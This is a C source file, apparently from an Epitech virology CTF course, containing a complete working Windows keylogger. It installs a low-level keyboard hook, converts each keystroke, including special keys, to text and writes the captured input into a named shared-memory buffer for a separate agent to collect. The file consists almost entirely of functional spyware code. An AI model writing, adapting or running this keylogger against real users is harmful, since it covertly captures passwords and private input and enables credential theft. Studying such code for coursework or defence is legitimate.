// ============================================================================
// KEYLOGGER WITH SHARED MEMORY - EPITECH T-VIR CTF
// ============================================================================
// Keylogger qui écrit dans la mémoire partagée au lieu d'un fichier
// L'agent peut lire cette mémoire pour récupérer les frappes
// ============================================================================

#include <windows.h>
#include <stdio.h>

// ============================================================================
// CONFIGURATION
// ============================================================================
#define SHARED_MEMORY_NAME "Local\\KeyloggerSharedMem"  // Local = pas besoin d'admin
#define SHARED_BUFFER_SIZE 4096
#define DEBUG_MODE_ENABLED

// ============================================================================
// STRUCTURE DE LA MÉMOIRE PARTAGÉE
// ============================================================================
typedef struct {
    volatile LONG write_index;    // Index d'écriture (modifié par keylogger)
    volatile LONG read_index;     // Index de lecture (modifié par agent)
    volatile LONG is_active;      // 1 si keylogger actif, 0 sinon
    char buffer[SHARED_BUFFER_SIZE]; // Buffer circulaire
} SharedKeyloggerData;

// ============================================================================
// VARIABLES GLOBALES
// ============================================================================
HHOOK g_keyboardHook = NULL;
HANDLE g_hMapFile = NULL;
SharedKeyloggerData* g_pSharedData = NULL;

// ============================================================================
// FONCTION - Initialiser la mémoire partagée
// ============================================================================
int InitializeSharedMemory() {
    // Créer ou ouvrir le fichier mappé en mémoire
    g_hMapFile = CreateFileMappingA(
        INVALID_HANDLE_VALUE,    // Utiliser le swap file
        NULL,                     // Sécurité par défaut
        PAGE_READWRITE,          // Lecture/écriture
        0,                       // Taille high DWORD
        sizeof(SharedKeyloggerData), // Taille low DWORD
        SHARED_MEMORY_NAME       // Nom de l'objet
    );

    if (g_hMapFile == NULL) {
        #ifdef DEBUG_MODE_ENABLED
        printf("[ERROR] CreateFileMapping failed: %lu\n", GetLastError());
        #endif
        return -1;
    }

    // Mapper la vue du fichier
    g_pSharedData = (SharedKeyloggerData*)MapViewOfFile(
        g_hMapFile,
        FILE_MAP_ALL_ACCESS,
        0, 0,
        sizeof(SharedKeyloggerData)
    );

    if (g_pSharedData == NULL) {
        #ifdef DEBUG_MODE_ENABLED
        printf("[ERROR] MapViewOfFile failed: %lu\n", GetLastError());
        #endif
        CloseHandle(g_hMapFile);
        return -1;
    }

    // Initialiser les index
    g_pSharedData->write_index = 0;
    g_pSharedData->read_index = 0;
    g_pSharedData->is_active = 1;

    #ifdef DEBUG_MODE_ENABLED
    printf("[+] Shared memory initialized: %s\n", SHARED_MEMORY_NAME);
    printf("[+] Buffer size: %d bytes\n", SHARED_BUFFER_SIZE);
    #endif

    return 0;
}

// ============================================================================
// FONCTION - Écrire un caractère dans la mémoire partagée
// ============================================================================
void WriteCharToSharedMemory(char c) {
    if (g_pSharedData == NULL) return;

    LONG write_idx = g_pSharedData->write_index;
    LONG next_write_idx = (write_idx + 1) % SHARED_BUFFER_SIZE;

    // Vérifier si le buffer est plein
    if (next_write_idx == g_pSharedData->read_index) {
        // Buffer plein, écraser les anciennes données
        #ifdef DEBUG_MODE_ENABLED
        printf("[WARNING] Buffer full, overwriting old data\n");
        #endif
    }

    // Écrire le caractère
    g_pSharedData->buffer[write_idx] = c;

    // Mettre à jour l'index d'écriture (atomique)
    InterlockedExchange(&g_pSharedData->write_index, next_write_idx);

    #ifdef DEBUG_MODE_ENABLED
    if (c == '\n') {
        printf("%c", c); // Afficher newline
    } else if (c >= 32 && c <= 126) {
        printf("%c", c); // Afficher caractère imprimable
    }
    fflush(stdout);
    #endif
}

// ============================================================================
// FONCTION - Écrire une chaîne dans la mémoire partagée
// ============================================================================
void WriteStringToSharedMemory(const char* str) {
    if (str == NULL) return;

    while (*str) {
        WriteCharToSharedMemory(*str);
        str++;
    }
}

// ============================================================================
// FONCTION - Conversion VK code vers char
// ============================================================================
char VKCodeToChar(DWORD vkCode, BOOL shift) {
    // Lettres A-Z
    if (vkCode >= 0x41 && vkCode <= 0x5A) {
        if (shift) {
            return (char)vkCode;
        } else {
            return (char)(vkCode + 32);
        }
    }

    // Chiffres 0-9
    if (vkCode >= 0x30 && vkCode <= 0x39) {
        if (shift) {
            const char shiftNumbers[] = ")!@#$%^&*(";
            return shiftNumbers[vkCode - 0x30];
        }
        return (char)vkCode;
    }

    // Touches spéciales
    switch (vkCode) {
        case VK_SPACE: return ' ';
        case VK_RETURN: return '\n';
        case VK_TAB: return '\t';
        case VK_OEM_PERIOD: return shift ? '>' : '.';
        case VK_OEM_COMMA: return shift ? '<' : ',';
        case VK_OEM_MINUS: return shift ? '_' : '-';
        case VK_OEM_PLUS: return shift ? '+' : '=';
        case VK_OEM_1: return shift ? ':' : ';';
        case VK_OEM_2: return shift ? '?' : '/';
        case VK_OEM_3: return shift ? '~' : '`';
        case VK_OEM_4: return shift ? '{' : '[';
        case VK_OEM_5: return shift ? '|' : '\\';
        case VK_OEM_6: return shift ? '}' : ']';
        case VK_OEM_7: return shift ? '"' : '\'';
        default: return 0;
    }
}

// ============================================================================
// CALLBACK - Hook clavier
// ============================================================================
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyBoard->vkCode;

        // Vérifier Shift/CapsLock
        BOOL shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        BOOL capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        BOOL shift = shiftPressed ^ capsLock;

        // Convertir en caractère
        char c = VKCodeToChar(vkCode, shift);

        if (c != 0) {
            WriteCharToSharedMemory(c);
        } else {
            // Touches spéciales
            switch (vkCode) {
                case VK_ESCAPE: WriteStringToSharedMemory("[ESC]"); break;
                case VK_DELETE: WriteStringToSharedMemory("[DEL]"); break;
                case VK_BACK: WriteStringToSharedMemory("[BACK]"); break;
                case VK_HOME: WriteStringToSharedMemory("[HOME]"); break;
                case VK_END: WriteStringToSharedMemory("[END]"); break;
                case VK_PRIOR: WriteStringToSharedMemory("[PGUP]"); break;
                case VK_NEXT: WriteStringToSharedMemory("[PGDN]"); break;
                case VK_LEFT: WriteStringToSharedMemory("[LEFT]"); break;
                case VK_RIGHT: WriteStringToSharedMemory("[RIGHT]"); break;
                case VK_UP: WriteStringToSharedMemory("[UP]"); break;
                case VK_DOWN: WriteStringToSharedMemory("[DOWN]"); break;
                case VK_CONTROL: WriteStringToSharedMemory("[CTRL]"); break;
                case VK_MENU: WriteStringToSharedMemory("[ALT]"); break;
                case VK_LWIN:
                case VK_RWIN: WriteStringToSharedMemory("[WIN]"); break;
            }
        }
    }

    return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
}

// ============================================================================
// FONCTION PRINCIPALE
// ============================================================================
int main(void) {
    #ifdef DEBUG_MODE_ENABLED
    AllocConsole();
    freopen("CONOUT$", "w", stdout);
    freopen("CONOUT$", "w", stderr);
    printf("========================================\n");
    printf("  Keylogger with Shared Memory\n");
    printf("========================================\n");
    #endif

    // Initialiser la mémoire partagée
    if (InitializeSharedMemory() != 0) {
        #ifdef DEBUG_MODE_ENABLED
        printf("[ERROR] Failed to initialize shared memory\n");
        printf("Press Enter to exit...\n");
        getchar();
        #endif
        return -1;
    }

    // Message de démarrage
    WriteStringToSharedMemory("=== Keylogger started ===\n");

    // Installer le hook clavier
    #ifdef DEBUG_MODE_ENABLED
    printf("[+] Installing keyboard hook...\n");
    #endif

    g_keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        KeyboardProc,
        GetModuleHandle(NULL),
        0
    );

    if (g_keyboardHook == NULL) {
        #ifdef DEBUG_MODE_ENABLED
        printf("[ERROR] Failed to install keyboard hook: %lu\n", GetLastError());
        printf("Press Enter to exit...\n");
        getchar();
        #endif
        return -1;
    }

    #ifdef DEBUG_MODE_ENABLED
    printf("[+] Keyboard hook installed!\n");
    printf("[+] Shared memory: %s\n", SHARED_MEMORY_NAME);
    printf("[+] Press Ctrl+C to stop\n");
    printf("========================================\n\n");
    #endif

    // Boucle de messages
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    #ifdef DEBUG_MODE_ENABLED
    printf("\n[+] Cleaning up...\n");
    #endif

    g_pSharedData->is_active = 0;
    UnhookWindowsHookEx(g_keyboardHook);

    if (g_pSharedData != NULL) {
        UnmapViewOfFile(g_pSharedData);
    }
    if (g_hMapFile != NULL) {
        CloseHandle(g_hMapFile);
    }

    #ifdef DEBUG_MODE_ENABLED
    printf("[+] Keylogger stopped\n");
    #endif

    return 0;
}
